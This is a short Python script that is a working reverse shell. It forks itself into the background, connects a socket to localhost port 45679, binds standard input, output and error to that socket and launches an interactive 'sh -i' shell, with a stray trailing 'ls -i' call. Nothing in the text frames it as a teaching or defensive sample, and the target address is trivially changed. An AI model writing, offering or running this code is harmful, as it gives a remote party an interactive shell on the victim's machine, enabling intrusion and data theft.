import socket
import subprocess
import os

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  if os.fork() > 0:
    os._exit(0)
except OSError as error:
  print(f'Error in fork process: {error.errno} ({error.strerror})')
  pid = os.fork()
  if pid > 0:
    print('Fork Not Valid!')

socket.connect(('localhost', 45679))
os.dup2(socket.fileno(), 0)
os.dup2(socket.fileno(), 1)
os.dup2(socket.fileno(), 2)
shell_remote = subprocess.call(["sh", "-i"])
list_files = subprocess.call(["ls", "-i"])